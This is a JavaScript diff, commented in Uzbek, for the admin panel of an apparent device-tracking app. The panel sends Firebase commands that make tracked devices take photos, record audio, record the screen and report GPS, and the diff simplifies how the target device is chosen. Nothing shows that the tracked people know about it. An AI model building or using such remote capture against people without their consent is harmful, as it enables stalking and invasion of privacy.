@@ -47,14 +47,20 @@ function attachAdminDeviceListeners(devId) {
 
   // Devices (Ko'p qurilmadan kirilganda qurilmalar ro'yxati)
   const devicesCb = snap => {
+    const now = Date.now();
     const list = [];
     snap.forEach(child => {
       const v = child.val();
       if (v) {
         v.id = v.id || child.key;
-        list.push(v);
+        // 24 soatdan ortiq ko'rinmagan juda eski sessiyalarni tashlab yuboramiz
+        const isStale = v.lastSeen && (now - v.lastSeen) > 86400000;
+        if (!isStale) {
+          list.push(v);
+        }
       }
     });
+    list.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
     adminUserDevices = list;
     renderAdminSubDevices();
   };
@@ -186,6 +192,8 @@ function attachAdminDeviceListeners(devId) {
 
 function selectAdminDevice(username) {
   adminSelectedUsername = username;
+  adminUserDevices = [];
+  adminSelectedDeviceId = 'all';
   adminDeviceData.photos = [];
   adminDeviceData.audios = [];
   adminDeviceData.screens = [];
@@ -329,23 +337,23 @@ function renderAdminSubDevices() {
   const select = document.getElementById('admin-subdevice-select');
   if (!container || !select) return;
 
-  if (!adminUserDevices || adminUserDevices.length <= 1) {
-    if (adminUserDevices.length === 1) {
-      adminSelectedDeviceId = adminUserDevices[0].id;
-    } else {
-      adminSelectedDeviceId = 'all';
-    }
+  if (!adminUserDevices || adminUserDevices.length === 0) {
+    adminSelectedDeviceId = 'all';
     container.style.display = 'none';
     return;
   }
 
   container.style.display = 'block';
+  if (adminSelectedDeviceId !== 'all' && !adminUserDevices.some(d => d.id === adminSelectedDeviceId)) {
+    adminSelectedDeviceId = 'all';
+  }
+
   select.innerHTML = `
     <option value="all" ${adminSelectedDeviceId === 'all' ? 'selected' : ''}>🌐 Barcha qurilmalar (${adminUserDevices.length} ta faol)</option>
     ${adminUserDevices.map(d => {
       const isOnline = (Date.now() - (d.lastSeen || 0)) < 70000;
       const statusIcon = isOnline ? '🟢' : '⚪';
-      const batteryStr = d.battery ? ` (Batareya: ${d.battery}%)` : '';
+      const batteryStr = (d.battery !== undefined && d.battery !== null) ? ` (🔋 ${d.battery}%)` : '';
       const devTitle = d.name || d.model || d.id;
       return `<option value="${escapeHtml(d.id)}" ${adminSelectedDeviceId === d.id ? 'selected' : ''}>
         ${statusIcon} ${escapeHtml(devTitle)}${batteryStr}
@@ -486,87 +494,12 @@ function updateAdminMapLocation(lat, lon) {
   }, 200);
 }
 
-// Multi-device selection modal flow
-let pendingDevicePickerCallback = null;
-
-function promptAdminDeviceTarget(actionName, onDeviceChosen) {
-  const now = Date.now();
-  const activeDevices = (adminUserDevices || []).filter(d => (now - (d.lastSeen || 0)) < 900000);
-  const devices = activeDevices.length > 0 ? activeDevices : (adminUserDevices || []);
-
-  if (devices.length <= 1) {
-    const chosenId = devices.length === 1 ? devices[0].id : (adminSelectedDeviceId || 'all');
-    onDeviceChosen(chosenId);
-    return;
-  }
-
-  pendingDevicePickerCallback = onDeviceChosen;
-  const modal = document.getElementById('admin-device-picker-modal');
-  const titleEl = document.getElementById('admin-device-picker-title');
-  const descEl = document.getElementById('admin-device-picker-desc');
-  const listEl = document.getElementById('admin-device-picker-list');
-
-  if (titleEl) titleEl.innerText = `${actionName} - Qurilmani tanlang`;
-  if (descEl) descEl.innerText = `Ushbu akkauntda ${devices.length} ta qurilma aniqlandi. Qaysi qurilmaga buyruq yuborilsin?`;
-
-  if (listEl) {
-    listEl.innerHTML = `
-      <div onclick="selectPickerDevice('all')" style="display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; background: #F0FDF4; border: 1.5px solid #86EFAC; border-radius: 10px; cursor: pointer; transition: background 0.2s;">
-        <div style="display: flex; align-items: center; gap: 10px;">
-          <span style="font-size: 20px;">🌐</span>
-          <div>
-            <div style="font-weight: 700; font-size: 13px; color: #166534;">Barcha qurilmalardan bir vaqtda</div>
-            <div style="font-size: 11px; color: #15803D;">Barcha ${devices.length} ta qurilmaga buyruq yuboriladi</div>
-          </div>
-        </div>
-        <span style="font-size: 11px; font-weight: bold; color: #16A34A; background: #DCFCE7; padding: 3px 8px; border-radius: 6px;">Hammasi</span>
-      </div>
-      ${devices.map(d => {
-        const isDevOnline = (now - (d.lastSeen || 0)) < 70000;
-        const isWeb = d.type === 'web' || (d.name && d.name.toLowerCase().includes('web'));
-        const icon = isWeb ? '💻' : '📱';
-        const name = d.name || d.model || d.id;
-        const bText = (d.battery !== undefined && d.battery !== null) ? ` • 🔋 ${d.battery}%` : '';
-        const timeAgo = Math.round((now - (d.lastSeen || 0)) / 1000);
-        const seenText = isDevOnline ? '🟢 Hozir Online' : `⚪ ${Math.round(timeAgo / 60)} daq. oldin`;
-
-        return `
-          <div onclick="selectPickerDevice('${escapeHtml(d.id)}')" style="display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; background: #F8FAFC; border: 1.5px solid #E2E8F0; border-radius: 10px; cursor: pointer; transition: background 0.2s;">
-            <div style="display: flex; align-items: center; gap: 10px;">
-              <span style="font-size: 20px;">${icon}</span>
-              <div>
-                <div style="font-weight: 700; font-size: 13px; color: var(--navy-dark);">${escapeHtml(name)}</div>
-                <div style="font-size: 11px; color: #64748B;">ID: ${escapeHtml(d.id.substring(0, 16))}${bText}</div>
-              </div>
-            </div>
-            <span style="font-size: 11px; font-weight: 600; color: ${isDevOnline ? '#16A34A' : '#64748B'}; background: ${isDevOnline ? '#DCFCE7' : '#F1F5F9'}; padding: 3px 8px; border-radius: 6px;">
-              ${seenText}
-            </span>
-          </div>
-        `;
-      }).join('')}
-    `;
-  }
-
-  if (modal) modal.style.display = 'flex';
-}
-
-function selectPickerDevice(deviceId) {
-  closeAdminDevicePicker();
-  adminSelectedDeviceId = deviceId;
-  const subSelect = document.getElementById('admin-subdevice-select');
-  if (subSelect) subSelect.value = deviceId;
-  if (pendingDevicePickerCallback) {
-    const cb = pendingDevicePickerCallback;
-    pendingDevicePickerCallback = null;
-    cb(deviceId);
-  }
-}
-
-function closeAdminDevicePicker() {
-  const modal = document.getElementById('admin-device-picker-modal');
-  if (modal) modal.style.display = 'none';
-  pendingDevicePickerCallback = null;
+function getAdminTargetDevice(targetId) {
+  const tid = targetId || adminSelectedDeviceId || 'all';
+  const targetDev = (adminUserDevices || []).find(d => d.id === tid);
+  const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : (tid === 'all' ? ' (barcha qurilmalarda)' : '');
+  const isOnline = targetDev ? ((Date.now() - (targetDev.lastSeen || 0)) < 70000) : ((Date.now() - (adminDeviceData.heartbeat || 0)) < 70000);
+  return { tid, targetDev, devName, isOnline };
 }
 
 // Commands
@@ -574,23 +507,18 @@ let lastAdminTakePhotoTime = 0;
 function adminSendTakePhoto() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
   const now = Date.now();
-  if (now - lastAdminTakePhotoTime < 2500) {
+  if (now - lastAdminTakePhotoTime < 2000) {
     showToast("Iltimos, kuting... Rasm olinmoqda");
     return;
   }
+  lastAdminTakePhotoTime = now;
 
-  promptAdminDeviceTarget("Rasm Olish", (chosenDevId) => {
-    lastAdminTakePhotoTime = Date.now();
-    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
-    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : (chosenDevId === 'all' ? ' (barcha qurilmalardan)' : '');
-    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
-
-    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
-      target_device_id: chosenDevId || 'all',
-      take_photo: Date.now()
-    });
-    showToast(isOnline ? `Rasm olish buyrug'i yuborildi${devName}!` : `Rasm olish buyrug'i navbatga qo'yildi${devName}`);
+  const { tid, devName, isOnline } = getAdminTargetDevice();
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+    target_device_id: tid,
+    take_photo: Date.now()
   });
+  showToast(isOnline ? `Rasm olish buyrug'i yuborildi${devName}!` : `Rasm olish buyrug'i navbatga qo'yildi${devName}`);
 }
 
 function adminToggleRecordAudio() {
@@ -610,24 +538,19 @@ function adminToggleRecordAudio() {
     return;
   }
 
-  promptAdminDeviceTarget("Ovoz Yozish", (chosenDevId) => {
-    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
-    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : (chosenDevId === 'all' ? ' (barcha qurilmalarda)' : '');
-    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
-
-    adminDeviceData.isAudioRecordingActive = true;
-    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
-      target_device_id: chosenDevId || 'all',
-      record_audio: true
-    });
-
-    const btn = document.getElementById('admin-voice-btn');
-    if (btn) {
-      btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish";
-      btn.className = "btn btn-red";
-    }
-    showToast(isOnline ? `Masofaviy ovoz yozish boshlandi${devName}` : `Ovoz yozish navbatga qo'yildi${devName}`);
+  const { tid, devName, isOnline } = getAdminTargetDevice();
+  adminDeviceData.isAudioRecordingActive = true;
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+    target_device_id: tid,
+    record_audio: true
   });
+
+  const btn = document.getElementById('admin-voice-btn');
+  if (btn) {
+    btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish";
+    btn.className = "btn btn-red";
+  }
+  showToast(isOnline ? `Masofaviy ovoz yozish boshlandi${devName}` : `Ovoz yozish navbatga qo'yildi${devName}`);
 }
 
 function adminToggleRecordScreen() {
@@ -647,39 +570,29 @@ function adminToggleRecordScreen() {
     return;
   }
 
-  promptAdminDeviceTarget("Ekran Zapis", (chosenDevId) => {
-    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
-    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : (chosenDevId === 'all' ? ' (barcha qurilmalarda)' : '');
-    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
-
-    adminDeviceData.isScreenRecordingActive = true;
-    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
-      target_device_id: chosenDevId || 'all',
-      record_screen: true
-    });
-
-    const btn = document.getElementById('admin-screen-btn');
-    if (btn) {
-      btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish";
-      btn.style.background = "#DC2626";
-    }
-    showToast(isOnline ? `Masofaviy ekran yozish boshlandi${devName}...` : `Ekran yozish navbatga qo'yildi${devName}`);
+  const { tid, devName, isOnline } = getAdminTargetDevice();
+  adminDeviceData.isScreenRecordingActive = true;
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+    target_device_id: tid,
+    record_screen: true
   });
+
+  const btn = document.getElementById('admin-screen-btn');
+  if (btn) {
+    btn.innerHTML = "<svg width='12' height='12' viewBox='0 0 24 24' fill='currentColor' style='vertical-align:-1px; margin-right:3px;'><rect x='6' y='6' width='12' height='12'/></svg>To'xtatish";
+    btn.style.background = "#DC2626";
+  }
+  showToast(isOnline ? `Masofaviy ekran yozish boshlandi${devName}...` : `Ekran yozish navbatga qo'yildi${devName}`);
 }
 
 function adminSendRequestGps() {
   if (!adminSelectedUsername || !window.firebaseRtdb) return;
-  promptAdminDeviceTarget("GPS Yangilash", (chosenDevId) => {
-    const targetDev = adminUserDevices.find(d => d.id === chosenDevId);
-    const devName = targetDev ? ` (${targetDev.name || targetDev.model || targetDev.id})` : '';
-    const isOnline = (Date.now() - (targetDev ? (targetDev.lastSeen || 0) : adminDeviceData.heartbeat)) < 70000;
-
-    window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
-      target_device_id: chosenDevId || 'all',
-      request_gps: Date.now()
-    });
-    showToast(isOnline ? `GPS yangilash so'rovi yuborildi${devName}!` : `GPS so'rovi navbatga qo'yildi${devName}`);
+  const { tid, devName, isOnline } = getAdminTargetDevice();
+  window.firebaseRtdb.ref(`tracking/devices/${adminSelectedUsername}/commands`).update({
+    target_device_id: tid,
+    request_gps: Date.now()
   });
+  showToast(isOnline ? `GPS yangilash so'rovi yuborildi${devName}!` : `GPS so'rovi navbatga qo'yildi${devName}`);
 }
 
 // Photos Viewer
@@ -954,6 +867,7 @@ function adminDownloadScreen(idx) {
 window.initAdminView = initAdminView;
 window.renderAdminView = renderAdminView;
 window.selectAdminDevice = selectAdminDevice;
+window.selectAdminSubDevice = selectAdminSubDevice;
 window.adminSendTakePhoto = adminSendTakePhoto;
 window.adminToggleRecordAudio = adminToggleRecordAudio;
 window.adminToggleRecordScreen = adminToggleRecordScreen;
